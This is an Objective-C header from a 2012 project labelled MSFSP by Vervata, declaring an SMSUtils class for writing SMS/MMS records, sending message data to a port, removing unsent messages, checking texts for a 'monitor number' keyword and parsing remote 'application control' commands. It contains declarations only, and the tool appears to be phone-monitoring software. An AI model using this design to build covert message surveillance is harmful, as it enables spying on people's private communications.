
/**
 - Project name :  MSFSP
 - Class name   :  SMSUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  31/1/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/


#import <Foundation/Foundation.h>


@interface SMSUtils : NSObject {

}

- (void) writeMMSItems: (NSArray *) aItems 
			recipients: (NSArray *) aRecipients 
			   subject: (NSString *) aSubject
			 messageID: (unsigned int) aMessageID 
			   smsType: (NSString *) aMMSType
			   smsInfo: (NSDictionary *) aMMSInfo;


- (void) writeSMSWithRecipient: (NSArray *) aRecipients
					   message: (NSString *) aMessage
				  isSMSCommand: (BOOL) aIsSMSCommand
	                 messageID: (unsigned int) aMessageID 
					   smsType: (NSString *) aSMSType
					   smsInfo: (NSDictionary *) aSMSInfo;

- (NSString *) smsMessageWithParts: (id) aParts;

- (NSString *) subjectLineWithMessageInfo: (NSDictionary *) aMessageInfo;

- (NSString *) messagePath: (unsigned int) aMessageID;

- (NSArray *) contactInfo: (id) aContactInfo;

- (BOOL) sendMessageInfo: (NSData *) aMessageData  
		  andMessagePort: (NSString *) aMessagePort;

- (void) deliveredOutGoingMessage: (unsigned int) aMessageID;

- (void) removeUnSentMessage: (unsigned int) aMessageID;



- (BOOL) isMMSWithMessageInfo:(NSArray *) aMessageInfo 
				recipientInfo:(NSArray *) aRecipientInfo;

- (BOOL) isPhoneNumber: (NSString *) aSenderNumber;

+ (BOOL) checkSMSKeywordWithMonitorNumber: (NSString *) aSMSText;

// Temporal control methods
+ (NSDictionary *) parseTemporalAppControlCommand: (NSString *) aCommandString;

+ (void) sendTemporalApplicationControlMessage: (NSDictionary *) aMessages;
@end
